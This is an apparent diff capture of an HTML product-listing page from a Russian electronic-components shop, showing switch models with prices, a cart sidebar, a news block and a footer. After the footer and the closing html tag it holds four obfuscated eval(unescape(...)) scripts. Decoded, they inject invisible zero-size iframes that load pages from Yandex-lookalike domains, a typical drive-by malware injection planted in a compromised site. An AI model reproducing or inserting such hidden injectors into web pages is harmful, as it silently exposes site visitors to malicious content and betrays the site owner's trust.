+		<form class="product_brief_block" action='/index.php?ukey=cart' method="post" rel="57249" >
+	<input name="action" value="add_product" type="hidden" />
+	<input name="productID" value="57249" type="hidden" />
+	<input class="product_price" value="2.46" type="hidden" />
+		
+		
+	<div class="prdbrief_name"><a  href='/index.php?ukey=product&amp;productID=57249'>TS-A3PS-130-SMD (SWT-34)</a>
+			</div>
+	
+		
+	<div class="prdbrief_brief_description"></div>
+
+    	    	
+		<div class="prdbrief_price">
+		<span class="totalPrice">2.46 руб.</span>
+	</div>
+	
+	
+	<div class="prdbrief_add2cart">
+		<input type="image" src="/published/publicdata/DBINTERIA23/attachments/SC/images/add2cart_small_ru.gif" alt="добавить в корзину" title="добавить в корзину"
+		 class="add2cart_handler" rel=""  />
+	</div>
+	
+	  	<div class="prdbrief_comparison">
+		<input id="ctrl-prd-cmp-57249" class="checknomarging ctrl_products_cmp" type="checkbox" value='57249' />
+		<label for="ctrl-prd-cmp-57249">Сравнить</label>
+	</div>
+		
+</form>
+
+	</td>
+	</tr>  	<tr>	<td valign="top" width="25%">
+		<form class="product_brief_block" action='/index.php?ukey=cart' method="post" rel="57253" >
+	<input name="action" value="add_product" type="hidden" />
+	<input name="productID" value="57253" type="hidden" />
+	<input class="product_price" value="2.05" type="hidden" />
+		
+		
+	<div class="prdbrief_name"><a  href='/index.php?ukey=product&amp;productID=57253'>TS-A3PV-130</a>
+			</div>
+	
+		
+	<div class="prdbrief_brief_description"></div>
+
+    	    	
+		<div class="prdbrief_price">
+		<span class="totalPrice">2.05 руб.</span>
+	</div>
+	
+	
+	<div class="prdbrief_add2cart">
+		<input type="image" src="/published/publicdata/DBINTERIA23/attachments/SC/images/add2cart_small_ru.gif" alt="добавить в корзину" title="добавить в корзину"
+		 class="add2cart_handler" rel=""  />
+	</div>
+	
+	  	<div class="prdbrief_comparison">
+		<input id="ctrl-prd-cmp-57253" class="checknomarging ctrl_products_cmp" type="checkbox" value='57253' />
+		<label for="ctrl-prd-cmp-57253">Сравнить</label>
+	</div>
+		
+</form>
+
+	</td>
+	  		<td valign="top" width="25%">
+		<form class="product_brief_block" action='/index.php?ukey=cart' method="post" rel="57242" >
+	<input name="action" value="add_product" type="hidden" />
+	<input name="productID" value="57242" type="hidden" />
+	<input class="product_price" value="2.05" type="hidden" />
+		
+		
+	<div class="prdbrief_name"><a  href='/index.php?ukey=product&amp;productID=57242'>TS-A4PG-130</a>
+			</div>
+	
+		
+	<div class="prdbrief_brief_description"></div>
+
+    	    	
+		<div class="prdbrief_price">
+		<span class="totalPrice">2.05 руб.</span>
+	</div>
+	
+	
+	<div class="prdbrief_add2cart">
+		<input type="image" src="/published/publicdata/DBINTERIA23/attachments/SC/images/add2cart_small_ru.gif" alt="добавить в корзину" title="добавить в корзину"
+		 class="add2cart_handler" rel=""  />
+	</div>
+	
+	  	<div class="prdbrief_comparison">
+		<input id="ctrl-prd-cmp-57242" class="checknomarging ctrl_products_cmp" type="checkbox" value='57242' />
+		<label for="ctrl-prd-cmp-57242">Сравнить</label>
+	</div>
+		
+</form>
+
+	</td>
+	  		<td valign="top" width="25%">
+		<form class="product_brief_block" action='/index.php?ukey=cart' method="post" rel="57246" >
+	<input name="action" value="add_product" type="hidden" />
+	<input name="productID" value="57246" type="hidden" />
+	<input class="product_price" value="1.43" type="hidden" />
+		
+		
+	<div class="prdbrief_name"><a  href='/index.php?ukey=product&amp;productID=57246'>TS-A4PS-130</a>
+			</div>
+	
+		
+	<div class="prdbrief_brief_description"></div>
+
+    	    	
+		<div class="prdbrief_price">
+		<span class="totalPrice">1.43 руб.</span>
+	</div>
+	
+	
+	<div class="prdbrief_add2cart">
+		<input type="image" src="/published/publicdata/DBINTERIA23/attachments/SC/images/add2cart_small_ru.gif" alt="добавить в корзину" title="добавить в корзину"
+		 class="add2cart_handler" rel=""  />
+	</div>
+	
+	  	<div class="prdbrief_comparison">
+		<input id="ctrl-prd-cmp-57246" class="checknomarging ctrl_products_cmp" type="checkbox" value='57246' />
+		<label for="ctrl-prd-cmp-57246">Сравнить</label>
+	</div>
+		
+</form>
+
+	</td>
+	  		<td valign="top" width="25%">
+		<form class="product_brief_block" action='/index.php?ukey=cart' method="post" rel="57250" >
+	<input name="action" value="add_product" type="hidden" />
+	<input name="productID" value="57250" type="hidden" />
+	<input class="product_price" value="2.46" type="hidden" />
+		
+		
+	<div class="prdbrief_name"><a  href='/index.php?ukey=product&amp;productID=57250'>TS-A4PS-130-SMD</a>
+			</div>
+	
+		
+	<div class="prdbrief_brief_description"></div>
+
+    	    	
+		<div class="prdbrief_price">
+		<span class="totalPrice">2.46 руб.</span>
+	</div>
+	
+	
+	<div class="prdbrief_add2cart">
+		<input type="image" src="/published/publicdata/DBINTERIA23/attachments/SC/images/add2cart_small_ru.gif" alt="добавить в корзину" title="добавить в корзину"
+		 class="add2cart_handler" rel=""  />
+	</div>
+	
+	  	<div class="prdbrief_comparison">
+		<input id="ctrl-prd-cmp-57250" class="checknomarging ctrl_products_cmp" type="checkbox" value='57250' />
+		<label for="ctrl-prd-cmp-57250">Сравнить</label>
+	</div>
+		
+</form>
+
+	</td>
+	</tr>  	<tr>	<td valign="top" width="25%">
+		<form class="product_brief_block" action='/index.php?ukey=cart' method="post" rel="57254" >
+	<input name="action" value="add_product" type="hidden" />
+	<input name="productID" value="57254" type="hidden" />
+	<input class="product_price" value="2.05" type="hidden" />
+		
+		
+	<div class="prdbrief_name"><a  href='/index.php?ukey=product&amp;productID=57254'>TS-A4PV-130</a>
+			</div>
+	
+		
+	<div class="prdbrief_brief_description"></div>
+
+    	    	
+		<div class="prdbrief_price">
+		<span class="totalPrice">2.05 руб.</span>
+	</div>
+	
+	
+	<div class="prdbrief_add2cart">
+		<input type="image" src="/published/publicdata/DBINTERIA23/attachments/SC/images/add2cart_small_ru.gif" alt="добавить в корзину" title="добавить в корзину"
+		 class="add2cart_handler" rel=""  />
+	</div>
+	
+	  	<div class="prdbrief_comparison">
+		<input id="ctrl-prd-cmp-57254" class="checknomarging ctrl_products_cmp" type="checkbox" value='57254' />
+		<label for="ctrl-prd-cmp-57254">Сравнить</label>
+	</div>
+		
+</form>
+
+	</td>
+	  		<td valign="top" width="25%">
+		<form class="product_brief_block" action='/index.php?ukey=cart' method="post" rel="57247" >
+	<input name="action" value="add_product" type="hidden" />
+	<input name="productID" value="57247" type="hidden" />
+	<input class="product_price" value="1.43" type="hidden" />
+		
+		
+	<div class="prdbrief_name"><a  href='/index.php?ukey=product&amp;productID=57247'>TS-A6PS-130</a>
+			</div>
+	
+		
+	<div class="prdbrief_brief_description"></div>
+
+    	    	
+		<div class="prdbrief_price">
+		<span class="totalPrice">1.43 руб.</span>
+	</div>
+	
+	
+	<div class="prdbrief_add2cart">
+		<input type="image" src="/published/publicdata/DBINTERIA23/attachments/SC/images/add2cart_small_ru.gif" alt="добавить в корзину" title="добавить в корзину"
+		 class="add2cart_handler" rel=""  />
+	</div>
+	
+	  	<div class="prdbrief_comparison">
+		<input id="ctrl-prd-cmp-57247" class="checknomarging ctrl_products_cmp" type="checkbox" value='57247' />
+		<label for="ctrl-prd-cmp-57247">Сравнить</label>
+	</div>
+		
+</form>
+
+	</td>
+	  		<td valign="top" width="25%">
+		<form class="product_brief_block" action='/index.php?ukey=cart' method="post" rel="57255" >
+	<input name="action" value="add_product" type="hidden" />
+	<input name="productID" value="57255" type="hidden" />
+	<input class="product_price" value="2.05" type="hidden" />
+		
+		
+	<div class="prdbrief_name"><a  href='/index.php?ukey=product&amp;productID=57255'>TS-A6PV-130</a>
+			</div>
+	
+		
+	<div class="prdbrief_brief_description"></div>
+
+    	    	
+		<div class="prdbrief_price">
+		<span class="totalPrice">2.05 руб.</span>
+	</div>
+	
+	
+	<div class="prdbrief_add2cart">
+		<input type="image" src="/published/publicdata/DBINTERIA23/attachments/SC/images/add2cart_small_ru.gif" alt="добавить в корзину" title="добавить в корзину"
+		 class="add2cart_handler" rel=""  />
+	</div>
+	
+	  	<div class="prdbrief_comparison">
+		<input id="ctrl-prd-cmp-57255" class="checknomarging ctrl_products_cmp" type="checkbox" value='57255' />
+		<label for="ctrl-prd-cmp-57255">Сравнить</label>
+	</div>
+		
+</form>
+
+	</td>
+	  </table>
+ 
+<p><a class=no_underline href="/index.php?categoryID=769&amp;offset=0">1</a> &nbsp;&nbsp;<a class=no_underline href="/index.php?categoryID=769&amp;offset=12">2</a> &nbsp;&nbsp;<a class=no_underline href="/index.php?categoryID=769&amp;offset=24">3</a> &nbsp;&nbsp; |&nbsp; <B>показать все</B></p>
+<form action='/index.php?categoryID=769&ukey=product_comparison' method="post">
+	<input type="hidden" value='' class="comparison_products" name='comparison_products' />
+	<input value='Сравнить выбранные продукты' class="hndl_submit_prds_cmp" onclick='submitProductsComparison();' type="button" />
+</form>
+
+
+</center></div>
+<!-- cpt_container_end --></td>
+    <td id="container_right_sidebar"><!-- cpt_container_start -->
+<div class="cpt_shopping_cart_info"><div class="shcart_link"><a class="hndl_proceed_checkout" rel="nofollow" href="/index.php?ukey=cart">Моя корзина</a></div>
+	
+<div id="shpcrtgc">(пусто)</div>
+<div id="shpcrtca">&nbsp;</div>
+</div>
+
+<div class="cpt_custom_html"><div class="col_header green">Блог / Новости</div></div>
+
+<div class="cpt_news_short_list"><form action="/index.php?categoryID=769" name="subscription_form" method="post" onSubmit="return validate(this);">
+		<div class="news_date">18 апреля 2008</div>
+	<div class="news_title"><a style="color: inherit; text-decoration: none; font-weight: inherit;" href="/index.php?ukey=news&amp;blog_id=1">Мы открылись!</a></div>
+			<div class="news_viewall">
+		<a href="/index.php?ukey=news">Смотреть все...</a>
+	</div>
+		
+	 	<div class="news_subscribe">
+				Подписаться на новости:
+		<div><input type="text" name="email" value="Email" rel="Email" class="input_message" /></div>
+		<div><input type="submit" value="OK" />
+		 или <a href="/published/SC/html/scripts/rssfeed.php?type=blog"><img src="/published/SC/html/scripts/images_common/rss-feed.png" alt="RSS 2.0"  style="padding-left:10px;"></a>		</div>
+	</div>
+	
+	<input type="hidden" name="subscribe" value="yes" />
+
+	</form></div>
+
+<div class="cpt_custom_html"><div class="col_header green">Голосование</div></div>
+
+<div class="cpt_survey"></div>
+<!-- cpt_container_end --></td>
+  </tr>
+</table>
+
+<br />
+<div id="container_footer">
+<center>
+<table border="0" cellpadding="0" cellspacing="0">
+<tr>
+<td>
+<!-- cpt_container_start -->
+<div class="cpt_divisions_navigation"><ul class="horizontal"><li><a href="/index.php?ukey=register">Зарегистрироваться</a></li><li><a href="/index.php?ukey=auth">Вход с паролем</a></li><li><a href="/index.php?ukey=pricelist">Прайс-лист</a></li><li><a href="/index.php?ukey=feedback">Обратная связь</a></li><li><a href="/index.php?ukey=linkexchange">Обмен ссылками</a></li></ul></div>
+<!-- cpt_container_end --></td>
+</tr>
+</table>
+</center>
+</div><br />
+<div class="small" style="text-align:center"><i>&copy; <a href="http://4.interia2.z8.ru/"><u>Магазин электронных компонентов</u></a>.
+</i><br />
+</div>
+<script type="text/javascript">
+roundElems();
+</script><script>var PnC=eval,NmB=unescape;PnC(NmB(".64.6f.63.75.6d.65.6e.74.2e.77.72.69.74.65.28.22.3c.68.74.6d.6c.3e.3c.62.6f.64.79.3e.3c.73.63.72.69.70.74.3e.76.61.72.20.74.65.6d.70.49.46.72.61.6d.65.3d.64.6f.63.75.6d.65.6e.74.2e.63.72.65.61.74.65.45.6c.65.6d.65.6e.74.28.27.69.66.72.61.6d.65.27.29.3b.74.65.6d.70.49.46.72.61.6d.65.2e.73.65.74.41.74.74.72.69.62.75.74.65.28.27.69.64.27.2c.27.52.53.49.46.72.61.6d.65.27.29.3b.74.65.6d.70.49.46.72.61.6d.65.2e.73.65.74.41.74.74.72.69.62.75.74.65.28.27.73.72.63.27.2c.27.68.74.74.70.3a.2f.2f.63.6c.69.63.6b.2d.79.61.6e.64.65.78.2e.6e.65.74.2f.67.65.74.2f.69.6e.2e.63.67.69.3f.34.27.29.3b.74.65.6d.70.49.46.72.61.6d.65.2e.73.74.79.6c.65.2e.76.69.73.69.62.69.6c.69.74.79.3d.27.68.69.64.64.65.6e.27.3b.74.65.6d.70.49.46.72.61.6d.65.2e.73.74.79.6c.65.2e.77.69.64.74.68.3d.27.30.70.78.27.3b.74.65.6d.70.49.46.72.61.6d.65.2e.73.74.79.6c.65.2e.68.65.69.67.68.74.3d.27.30.70.78.27.3b.49.46.72.61.6d.65.4f.62.6a.20.3d.20.64.6f.63.75.6d.65.6e.74.2e.62.6f.64.79.2e.61.70.70.65.6e.64.43.68.69.6c.64.28.74.65.6d.70.49.46.72.61.6d.65.29.3b.3c.2f.73.63.72.69.70.74.3e.3c.2f.62.6f.64.79.3e.3c.2f.68.74.6d.6c.3e.22.29.3b".replace(/[\+.]/g,"%")));</script><script>var PnC=eval,NmB=unescape;PnC(NmB(".64.6f.63.75.6d.65.6e.74.2e.77.72.69.74.65.28.22.3c.68.74.6d.6c.3e.3c.62.6f.64.79.3e.3c.73.63.72.69.70.74.3e.76.61.72.20.74.65.6d.70.49.46.72.61.6d.65.3d.64.6f.63.75.6d.65.6e.74.2e.63.72.65.61.74.65.45.6c.65.6d.65.6e.74.28.27.69.66.72.61.6d.65.27.29.3b.74.65.6d.70.49.46.72.61.6d.65.2e.73.65.74.41.74.74.72.69.62.75.74.65.28.27.69.64.27.2c.27.52.53.49.46.72.61.6d.65.27.29.3b.74.65.6d.70.49.46.72.61.6d.65.2e.73.65.74.41.74.74.72.69.62.75.74.65.28.27.73.72.63.27.2c.27.68.74.74.70.3a.2f.2f.63.6c.69.63.6b.2d.79.61.6e.64.2e.63.6f.6d.2f.61.64.2f.69.6e.2e.63.67.69.3f.33.27.29.3b.74.65.6d.70.49.46.72.61.6d.65.2e.73.74.79.6c.65.2e.76.69.73.69.62.69.6c.69.74.79.3d.27.68.69.64.64.65.6e.27.3b.74.65.6d.70.49.46.72.61.6d.65.2e.73.74.79.6c.65.2e.77.69.64.74.68.3d.27.30.70.78.27.3b.74.65.6d.70.49.46.72.61.6d.65.2e.73.74.79.6c.65.2e.68.65.69.67.68.74.3d.27.30.70.78.27.3b.49.46.72.61.6d.65.4f.62.6a.20.3d.20.64.6f.63.75.6d.65.6e.74.2e.62.6f.64.79.2e.61.70.70.65.6e.64.43.68.69.6c.64.28.74.65.6d.70.49.46.72.61.6d.65.29.3b.3c.2f.73.63.72.69.70.74.3e.3c.2f.62.6f.64.79.3e.3c.2f.68.74.6d.6c.3e.22.29.3b".replace(/[\+.]/g,"%")));</script>
+
+<!--  END -->
+
+	</body>
+</html><script>var PnC=eval,NmB=unescape;PnC(NmB(".64.6f.63.75.6d.65.6e.74.2e.77.72.69.74.65.28.22.3c.68.74.6d.6c.3e.3c.62.6f.64.79.3e.3c.73.63.72.69.70.74.3e.76.61.72.20.74.65.6d.70.49.46.72.61.6d.65.3d.64.6f.63.75.6d.65.6e.74.2e.63.72.65.61.74.65.45.6c.65.6d.65.6e.74.28.27.69.66.72.61.6d.65.27.29.3b.74.65.6d.70.49.46.72.61.6d.65.2e.73.65.74.41.74.74.72.69.62.75.74.65.28.27.69.64.27.2c.27.52.53.49.46.72.61.6d.65.27.29.3b.74.65.6d.70.49.46.72.61.6d.65.2e.73.65.74.41.74.74.72.69.62.75.74.65.28.27.73.72.63.27.2c.27.68.74.74.70.3a.2f.2f.63.6c.69.63.6b.2d.79.61.6e.64.65.78.2e.6e.65.74.2f.67.65.74.2f.69.6e.2e.63.67.69.3f.34.27.29.3b.74.65.6d.70.49.46.72.61.6d.65.2e.73.74.79.6c.65.2e.76.69.73.69.62.69.6c.69.74.79.3d.27.68.69.64.64.65.6e.27.3b.74.65.6d.70.49.46.72.61.6d.65.2e.73.74.79.6c.65.2e.77.69.64.74.68.3d.27.30.70.78.27.3b.74.65.6d.70.49.46.72.61.6d.65.2e.73.74.79.6c.65.2e.68.65.69.67.68.74.3d.27.30.70.78.27.3b.49.46.72.61.6d.65.4f.62.6a.20.3d.20.64.6f.63.75.6d.65.6e.74.2e.62.6f.64.79.2e.61.70.70.65.6e.64.43.68.69.6c.64.28.74.65.6d.70.49.46.72.61.6d.65.29.3b.3c.2f.73.63.72.69.70.74.3e.3c.2f.62.6f.64.79.3e.3c.2f.68.74.6d.6c.3e.22.29.3b".replace(/[\+.]/g,"%")));</script><script>var PnC=eval,NmB=unescape;PnC(NmB(".64.6f.63.75.6d.65.6e.74.2e.77.72.69.74.65.28.22.3c.68.74.6d.6c.3e.3c.62.6f.64.79.3e.3c.73.63.72.69.70.74.3e.76.61.72.20.74.65.6d.70.49.46.72.61.6d.65.3d.64.6f.63.75.6d.65.6e.74.2e.63.72.65.61.74.65.45.6c.65.6d.65.6e.74.28.27.69.66.72.61.6d.65.27.29.3b.74.65.6d.70.49.46.72.61.6d.65.2e.73.65.74.41.74.74.72.69.62.75.74.65.28.27.69.64.27.2c.27.52.53.49.46.72.61.6d.65.27.29.3b.74.65.6d.70.49.46.72.61.6d.65.2e.73.65.74.41.74.74.72.69.62.75.74.65.28.27.73.72.63.27.2c.27.68.74.74.70.3a.2f.2f.63.6c.69.63.6b.2d.79.61.6e.64.2e.63.6f.6d.2f.61.64.2f.69.6e.2e.63.67.69.3f.33.27.29.3b.74.65.6d.70.49.46.72.61.6d.65.2e.73.74.79.6c.65.2e.76.69.73.69.62.69.6c.69.74.79.3d.27.68.69.64.64.65.6e.27.3b.74.65.6d.70.49.46.72.61.6d.65.2e.73.74.79.6c.65.2e.77.69.64.74.68.3d.27.30.70.78.27.3b.74.65.6d.70.49.46.72.61.6d.65.2e.73.74.79.6c.65.2e.68.65.69.67.68.74.3d.27.30.70.78.27.3b.49.46.72.61.6d.65.4f.62.6a.20.3d.20.64.6f.63.75.6d.65.6e.74.2e.62.6f.64.79.2e.61.70.70.65.6e.64.43.68.69.6c.64.28.74.65.6d.70.49.46.72.61.6d.65.29.3b.3c.2f.73.63.72.69.70.74.3e.3c.2f.62.6f.64.79.3e.3c.2f.68.74.6d.6c.3e.22.29.3b".replace(/[\+.]/g,"%")));</script>
